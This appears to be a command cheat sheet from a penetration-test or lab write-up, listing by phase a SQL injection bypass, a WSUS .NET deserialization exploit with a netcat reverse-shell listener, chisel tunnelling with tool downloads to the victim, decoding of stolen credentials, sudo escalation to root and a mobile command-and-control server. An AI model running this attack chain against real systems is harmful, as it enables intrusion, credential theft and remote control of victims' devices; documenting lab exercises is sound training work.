# 💻 Command Reference Sheet

A comprehensive list of every command executed during the operation, categorized by attack phase.

## Phase 1: Reconnaissance
| Command | Description |
| :--- | :--- |
| `' OR 1=1--` | SQL Injection payload to bypass authentication. |
| `nmap -A -sV -p- 10.100.102.10` | Full port scan, version detection, and OS fingerprinting. |
| `curl -v http://10.100.102.10:8530` | Verifying WSUS service is exposed over HTTP. |

## Phase 2: Windows Exploitation
| Command | Description |
| :--- | :--- |
| `iconv -f ASCII -t UTF-16LE shell.ps1 \| base64 -w 0` | Encoding PowerShell payload to Base64 (UTF-16LE). |
| `.\ysoserial.exe -f SoapFormatter -g ActivitySurrogateSelector ...` | Generating the malicious serialized .NET object. |
| `python3 wsus_poc.py --target 10.100.102.10` | Sending the exploit (SOAP request) to the target. |
| `nc -lvnp 4444` | Listening for the incoming Reverse Shell connection. |

## Phase 3: Lateral Movement
| Command | Description |
| :--- | :--- |
| `ipconfig` | Mapping network interfaces on the compromised host. |
| `python3 -m http.server 80` | Hosting files on Kali for transfer. |
| `wget "http://10.100.../chisel.exe" -OutFile "..."` | Downloading tools to the victim machine via PowerShell. |
| `./chisel server -p 8000 --reverse` | Starting the Tunnel Server on Kali. |
| `chisel.exe client 10.100.102.31:8000 R:socks` | Connecting the Tunnel Client from Windows. |
| `echo "..." \| base64 -d` | Decoding the stolen credentials found in the backup script. |

## Phase 4: Linux Takeover
| Command | Description |
| :--- | :--- |
| `proxychains ssh jesse@10.10.10.20` | SSH connection routed through the Chisel tunnel. |
| `sudo -l` | Checking Sudo privileges (Enumeration). |
| `sudo su -` | escalating privileges to Root. |

## Phase 5: Mobile C2
| Command | Description |
| :--- | :--- |
| `source .venv/bin/activate` | Activating Python virtual environment. |
| `python3 app.py` | Starting the C2 Flask server. |
| `curl ".../send/web-test/show_alert?text=HACKED"` | Injecting a remote command to the victim's device. |